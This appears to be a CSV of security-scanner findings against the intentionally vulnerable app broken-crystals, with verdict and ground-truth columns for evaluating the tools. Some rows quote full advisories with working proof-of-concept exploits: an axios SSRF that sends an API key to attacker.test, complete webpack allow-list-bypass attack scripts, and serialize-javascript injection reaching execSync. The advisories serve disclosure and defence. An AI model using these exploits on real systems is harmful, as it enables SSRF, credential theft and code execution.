finding_group_id,tools,target,cwe,severity,location,description,verdict,confidence,ground_truth_match,tool_count
GRP-broken-crystals-CWE-908-919,trivy,broken-crystals,CWE-908,high,linux-libc-dev@4.19.269-1,kernel: btrfs: fix information leak in btrfs_ioctl_logical_to_ino(),pending,low,no,1
GRP-broken-crystals-CWE-909-920,trivy,broken-crystals,CWE-909,medium,linux-libc-dev@4.19.269-1,kernel: llc: Drop support for ETH_P_TR_802_2.,pending,low,no,1
GRP-broken-crystals-CWE-911-921,trivy,broken-crystals,CWE-911,high,linux-libc-dev@4.19.269-1,kernel: AoE: improper reference count leads to use-after-free vulnerability,pending,low,no,1
GRP-broken-crystals-CWE-918-922,npm-audit,broken-crystals,CWE-918,high,axios,axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL,TP,medium,yes,1
GRP-broken-crystals-CWE-918-923,npm-audit,broken-crystals,CWE-918,high,webpack,webpack buildHttp: allowedUris allow-list bypass via URL userinfo (@) leading to build-time SSRF behavior,TP,medium,yes,1
GRP-broken-crystals-CWE-918-924,dep-check,broken-crystals,CWE-918,high,axios:1.7.7,"### Summary A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463 A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios. ### Details Consider the following code snippet: ```js import axios from ""axios""; const internalAPIClient = axios.create({ baseURL: ""http://example.test/api/v1/users/"", headers: { ""X-API-KEY"": ""1234567890"", }, }); // const userId = ""123""; const userId = ""http://attacker.test/""; await internalAPIClient.get(userId); // SSRF ``` In this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers. It is recommended that: - When `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`. - Before sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`. ### PoC Follow the steps below to reproduce the issue: 1. Set up two simple HTTP servers: ``` mkdir /tmp/server1 /tmp/server2 echo ""this is server1"" > /tmp/server1/index.html echo ""this is server2"" > /tmp/server2/index.html python -m http.server -d /tmp/server1 10001 & python -m http.server -d /tmp/server2 10002 & ``` 2. Create a script (e.g., main.js): ```js import axios from ""axios""; const client = axios.create({ baseURL: ""http://localhost:10001/"" }); const response = await client.get(""http://localhost:10002/""); console.log(response.data); ``` 3. Run the script: ``` $ node main.js this is server2 ``` Even though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`. ### Impact - Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed. - SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running. - Affected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",TP,medium,yes,1
GRP-broken-crystals-CWE-918-925,dep-check,broken-crystals,CWE-918,low,webpack:5.96.1,"### Summary When `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) enforces `allowedUris` only for the **initial** URL, but **does not re-validate `allowedUris` after following HTTP 30x redirects**. As a result, an import that appears restricted to a trusted allow-list can be redirected to **HTTP(S) URLs outside the allow-list**. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion in build outputs** (redirected content is treated as module source and bundled). In my reproduction, the internal response is also persisted in the buildHttp cache. ### Details In the HTTP scheme resolver, the allow-list check (`allowedUris`) is performed when metadata/info is created for the original request (via `getInfo()`), but the content-fetch path follows redirects by resolving the `Location` URL without re-checking whether the redirected URL is within `allowedUris`. Practical consequence: if an “allowed” host/path can return a 302 (or has an open redirect), it can point to an external URL or an internal-only URL (SSRF). The redirected response is consumed as module content, bundled, and can be cached. If the redirect target is attacker-controlled, this can potentially result in attacker-controlled JavaScript being bundled and later executed when the resulting bundle runs. **Figure 1 (evidence screenshot):** left pane shows the allowed host issuing a 302 redirect to `http://127.0.0.1:9100/secret.js`; right pane shows the build output confirming allow-list bypass and that the secret appears in the bundle and buildHttp cache. <img width=""1648"" height=""461"" alt=""image"" src=""https://github.com/user-attachments/assets/bb25f3ff-1919-49f9-951b-ad50bf0c7524"" /> ### PoC This PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely. #### 1) Setup ```bash mkdir split-ssrf-poc && cd split-ssrf-poc npm init -y npm i -D webpack webpack-cli ``` #### 2) Create server.js ```js #!/usr/bin/env node ""use strict""; const http = require(""http""); const url = require(""url""); const allowedPort = 9000; const internalPort = 9100; const internalUrlDefault = `http://127.0.0.1:${internalPort}/secret.js`; const secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`; const internalPayload = `export const secret = ${JSON.stringify(secret)};\n` + `export default ""ok"";\n`; function start(port, handler) { return new Promise(resolve => { const s = http.createServer(handler); s.listen(port, ""127.0.0.1"", () => resolve(s)); }); } (async () => { // Internal-only service (SSRF target) await start(internalPort, (req, res) => { if (req.url === ""/secret.js"") { res.statusCode = 200; res.setHeader(""Content-Type"", ""application/javascript; charset=utf-8""); res.end(internalPayload); console.log(`[internal] 200 /secret.js served (secret=${secret})`); return; } res.statusCode = 404; res.end(""not found""); }); // Allowed host (redirector) await start(allowedPort, (req, res) => { const parsed = url.parse(req.url, true); if (parsed.pathname === ""/redirect.js"") { const to = parsed.query.to || internalUrlDefault; // Safety guard: only allow redirecting to localhost internal service in this PoC if (!to.startsWith(`http://127.0.0.1:${internalPort}/`)) { res.statusCode = 400; res.end(""to must be internal-only in this PoC""); console.log(`[allowed] blocked redirect to: ${to}`); return; } res.statusCode = 302; res.setHeader(""Location"", to); res.end(""redirecting""); console.log(`[allowed] 302 /redirect.js -> ${to}`); return; } res.statusCode = 404; res.end(""not found""); }); console.log(`\nServer running:`); console.log(`- allowed host: http://127.0.0.1:${allowedPort}/redirect.js`); console.log(`- internal-only: http://127.0.0.1:${internalPort}/secret.js`); })(); ``` #### 3) Create attacker.js ```js #!/usr/bin/env node ""use strict""; const path = require(""path""); const os = require(""os""); const fs = require(""fs/promises""); const webpack = require(""webpack""); const webpackPkg = require(""webpack/package.json""); const allowedPort = 9000; const internalPort = 9100; const allowedBase = `http://127.0.0.1:${allowedPort}/`; const internalTarget = `http://127.0.0.1:${internalPort}/secret.js`; const entryUrl = `${allowedBase}redirect.js?to=${encodeURIComponent(internalTarget)}`; async function walk(dir) { const out = []; const items = await fs.readdir(dir, { withFileTypes: true }); for (const it of items) { const p = path.join(dir, it.name); if (it.isDirectory()) out.push(...await walk(p)); else if (it.isFile()) out.push(p); } return out; } async function fileContains(f, needle) { try { const buf = await fs.readFile(f); return buf.toString(""utf8"").includes(needle) || buf.toString(""latin1"").includes(needle); } catch { return false; } } async function findInFiles(files, needle) { const hits = []; for (const f of files) if (await fileContains(f, needle)) hits.push(f); return hits; } const fmtBool = b => (b ? ""✅"" : ""❌""); (async () => { const tmp = await fs.mkdtemp(path.join(os.tmpdir(), ""webpack-attacker-"")); const srcDir = path.join(tmp, ""src""); const distDir = path.join(tmp, ""dist""); const cacheDir = path.join(tmp, "".buildHttp-cache""); const lockfile = path.join(tmp, ""webpack.lock""); const bundlePath = path.join(distDir, ""bundle.js""); await fs.mkdir(srcDir, { recursive: true }); await fs.mkdir(distDir, { recursive: true }); await fs.writeFile( path.join(srcDir, ""index.js""), `import { secret } from ${JSON.stringify(entryUrl)}; console.log(""LEAKED_SECRET:"", secret); export default secret; ` ); const config = { context: tmp, mode: ""development"", entry: ""./src/index.js"", output: { path: distDir, filename: ""bundle.js"" }, experiments: { buildHttp: { allowedUris: [allowedBase], cacheLocation: cacheDir, lockfileLocation: lockfile, upgrade: true } } }; const compiler = webpack(config); compiler.run(async (err, stats) => { try { if (err) throw err; const info = stats.toJson({ all: false, errors: true, warnings: true }); if (stats.hasErrors()) { console.error(info.errors); process.exitCode = 1; return; } const bundle = await fs.readFile(bundlePath, ""utf8""); const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i); const secret = m ? m[0] : null; console.log(""\n[ATTACKER RESULT]""); console.log(`- webpack version: ${webpackPkg.version}`); console.log(`- node version: ${process.version}`); console.log(`- allowedUris: ${JSON.stringify([allowedBase])}`); console.log(`- imported URL (allowed only): ${entryUrl}`); console.log(`- temp dir: ${tmp}`); console.log(`- lockfile: ${lockfile}`); console.log(`- cacheDir: ${cacheDir}`); console.log(`- bundle: ${bundlePath}`); if (!secret) { console.log(""\n[SECURITY SUMMARY]""); console.log(`- bundle contains internal secret marker: ${fmtBool(false)}`); return; } const lockHit = await fileContains(lockfile, secret); let cacheFiles = []; try { cacheFiles = await walk(cacheDir); } catch { cacheFiles = []; } const cacheHit = cacheFiles.length ? (await findInFiles(cacheFiles, secret)).length > 0 : false; const allTmpFiles = await walk(tmp); const allHits = await findInFiles(allTmpFiles, secret); console.log(`\n- extracted secret marker from bundle: ${secret}`); console.log(""\n[SECURITY SUMMARY]""); console.log(`- Redirect allow-list bypass: ${fmtBool(true)} (imported allowed URL, but internal target was fetched)`); console.log(`- Internal target (SSRF-like): ${internalTarget}`); console.log(`- EXPECTED: internal target should be BLOCKED by allowedUris`); console.log(`- ACTUAL: internal content treated as module and bundled`); console.log(""\n[EVIDENCE CHECKLIST]""); console.log(`- bundle contains secret: ${fmtBool(true)}`); console.log(`- cache contains secret: ${fmtBool(cacheHit)}`); console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`); console.log(""\n[PERSISTENCE CHECK] files containing secret""); for (const f of allHits.slice(0, 30)) console.log(`- ${f}`); if (allHits.length > 30) console.log(`- ... and ${allHits.length - 30} more`); } catch (e) { console.error(e); process.exitCode = 1; } finally { compiler.close(() => {}); } }); })(); ``` #### 4) Run Terminal A: ```bash node server.js ``` Terminal B: ```bash node attacker.js ``` #### 5) Expected Expected: Redirect target should be rejected if not in allowedUris (only http://127.0.0.1:9000/ is allowed). ### Impact Vulnerability class: Policy/allow-list bypass leading to SSRF behavior at build time and untrusted content inclusion in build outputs (and potentially bundling of attacker-controlled JavaScript if the redirect target is attacker-controlled). Who is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary (to restrict remote module fetching). In such environments, an attacker who can influence imported URLs (e.g., via source contribution, dependency manipulation, or configuration) and can cause an allowed endpoint to redirect can: trigger network requests from the build machine to internal-only services (SSRF behavior), cause content from outside the allow-list to be bundled into build outputs, and cause fetched responses to persist in build artifacts (e.g., buildHttp cache), increasing the risk of later exfiltration.",TP,medium,yes,1
GRP-broken-crystals-CWE-918-926,trivy,broken-crystals,CWE-918,high,axios@0.21.4,axios: Possible SSRF and Credential Leakage via Absolute URL in axios Requests,TP,medium,yes,1
GRP-broken-crystals-CWE-918-927,trivy,broken-crystals,CWE-918,high,axios@0.26.1,axios: Possible SSRF and Credential Leakage via Absolute URL in axios Requests,TP,medium,yes,1
GRP-broken-crystals-CWE-918-928,trivy,broken-crystals,CWE-918,high,ip@1.1.5,node-ip: Incomplete fix for CVE-2023-42282,TP,medium,yes,1
GRP-broken-crystals-CWE-918-929,trivy,broken-crystals,CWE-918,high,ip@2.0.0,node-ip: Incomplete fix for CVE-2023-42282,TP,medium,yes,1
GRP-broken-crystals-CWE-918-930,trivy,broken-crystals,CWE-918,medium,request@2.88.2,request: bypass of SSRF mitigations when following a cross-protocol redirect,TP,medium,yes,1
GRP-broken-crystals-CWE-920-931,trivy,broken-crystals,CWE-920,medium,linux-libc-dev@4.19.269-1,kernel: wifi: mac80211: don&#39;t return unset power in ieee80211_get_tx_power(),pending,low,no,1
GRP-broken-crystals-CWE-94-932,npm-audit,broken-crystals,CWE-94,info,@nestjs/common,nest allows a remote attacker to execute arbitrary code via the Content-Type header,TP,medium,yes,1
GRP-broken-crystals-CWE-94-933,dep-check,broken-crystals,CWE-94,info,@nestjs/common:10.4.7,File Upload vulnerability in nestjs nest prior to v.11.0.16 allows a remote attacker to execute arbitrary code via the Content-Type header.,TP,medium,yes,1
GRP-broken-crystals-CWE-94-934,trivy,broken-crystals,CWE-94,medium,@nestjs/common@9.3.9,nest allows a remote attacker to execute arbitrary code via the Content-Type header,TP,medium,yes,1
GRP-broken-crystals-CWE-96-935,npm-audit,broken-crystals,CWE-96,high,serialize-javascript,Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString(),pending,low,no,1
GRP-broken-crystals-CWE-96-936,dep-check,broken-crystals,CWE-96,high,serialize-javascript:6.0.2,"### Impact The serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660. While `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`. If an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes. ``` javascript const serialize = require('serialize-javascript'); // Create an object that passes instanceof RegExp with a spoofed .flags const fakeRegex = Object.create(RegExp.prototype); Object.defineProperty(fakeRegex, 'source', { get: () => 'x' }); Object.defineProperty(fakeRegex, 'flags', { get: () => '""+(global.PWNED=""CODE_INJECTION_VIA_FLAGS"")+""' }); fakeRegex.toJSON = function() { return '@placeholder'; }; const output = serialize({ re: fakeRegex }); // Output: {""re"":new RegExp(""x"", """"+(global.PWNED=""CODE_INJECTION_VIA_FLAGS"")+"""")} let obj; eval('obj = ' + output); console.log(global.PWNED); // ""CODE_INJECTION_VIA_FLAGS"" — injected code executed! #h2. PoC 2: Code Injection via Date.toISOString() ``` ``` javascript const serialize = require('serialize-javascript'); const fakeDate = Object.create(Date.prototype); fakeDate.toISOString = function() { return '""+(global.DATE_PWNED=""DATE_INJECTION"")+""'; }; fakeDate.toJSON = function() { return '2024-01-01'; }; const output = serialize({ d: fakeDate }); // Output: {""d"":new Date(""""+(global.DATE_PWNED=""DATE_INJECTION"")+"""")} eval('obj = ' + output); console.log(global.DATE_PWNED); // ""DATE_INJECTION"" — injected code executed! #h2. PoC 3: Remote Code Execution ``` ``` javascript const serialize = require('serialize-javascript'); const rceRegex = Object.create(RegExp.prototype); Object.defineProperty(rceRegex, 'source', { get: () => 'x' }); Object.defineProperty(rceRegex, 'flags', { get: () => '""+require(""child_process"").execSync(""id"").toString()+""' }); rceRegex.toJSON = function() { return '@rce'; }; const output = serialize({ re: rceRegex }); // Output: {""re"":new RegExp(""x"", """"+require(""child_process"").execSync(""id"").toString()+"""")} // When eval'd on a Node.js server, executes the ""id"" system command ``` ### Patches The fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3",pending,low,no,1
